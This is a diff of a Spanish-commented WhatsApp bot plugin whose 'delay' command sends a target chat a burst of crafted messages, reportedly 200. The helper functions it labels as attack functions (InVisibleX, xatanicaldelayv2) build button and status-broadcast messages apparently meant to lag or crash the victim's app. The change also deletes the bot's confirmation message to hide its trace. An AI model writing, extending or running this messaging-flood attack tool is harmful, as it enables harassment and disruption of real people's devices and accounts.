@@ -10,7 +10,19 @@ let handler = async (m, { conn }) => {
       await delay(10); // 🔁 Pausa para evitar rate-overlimit
     }
 
-    await conn.sendMessage(jid, { text: "✅ Delay enviado 200 veces." }, { quoted: m });
+    // ✅ Enviar mensaje final y eliminarlo solo para el bot
+    const sent = await conn.sendMessage(jid, { text: "✅ Delay enviado 200 veces." }, { quoted: m });
+
+    // 🔁 Eliminar solo para el bot (no afecta al receptor)
+    await conn.sendMessage(jid, {
+      delete: {
+        remoteJid: jid,
+        fromMe: true,
+        id: sent.key.id,
+        participant: conn.user.id
+      }
+    });
+
   } catch (e) {
     console.error("❌ Error en delay:", e);
     await conn.sendMessage(jid, { text: "❌ Error al ejecutar:\n" + e.message }, { quoted: m });
@@ -20,13 +32,12 @@ let handler = async (m, { conn }) => {
 handler.command = /^delay$/i;
 export default handler;
 
-// 🔁 Función delay para evitar rate limit
+// 🔁 Función delay
 function delay(ms) {
   return new Promise(resolve => setTimeout(resolve, ms));
 }
 
-// 📡 FUNCIONES
-
+// 📡 FUNCIONES DE ATAQUE (sin cambios)
 async function InVisibleX(sock, jid, mention) {
   let msg = await generateWAMessageFromContent(jid, {
     buttonsMessage: {
@@ -136,7 +147,6 @@ async function xatanicaldelayv2(sock, jid, mention) {
   };
 
   const msg = generateWAMessageFromContent(jid, message, {});
-
   await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [jid],
